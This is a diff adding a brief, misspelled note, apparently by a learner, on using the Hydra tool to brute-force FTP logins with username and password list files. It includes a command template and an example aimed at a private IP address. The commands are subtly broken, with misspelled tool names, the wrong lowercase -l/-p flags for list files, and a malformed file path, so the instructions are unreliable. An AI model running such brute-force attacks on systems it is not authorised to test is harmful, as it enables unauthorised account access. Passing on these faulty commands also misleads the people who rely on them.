@@ -1,0 +1,10 @@
+using hydra as an exploitation
+to exploit ftp
+firt you have to creat a file containing list of  username and passwords
+then you use the command key
+hydr -l /home/kali/downloads/username.txt -p /home/kali/downloads/password.txt (ip adress of the target) FTP -V
+
+FOR EXAMPLE
+
+hydra-l /home/kali/downloads/username.txt -p /home/kali/downloads/passwordtxt 192.168.245.1 ftp -v
+
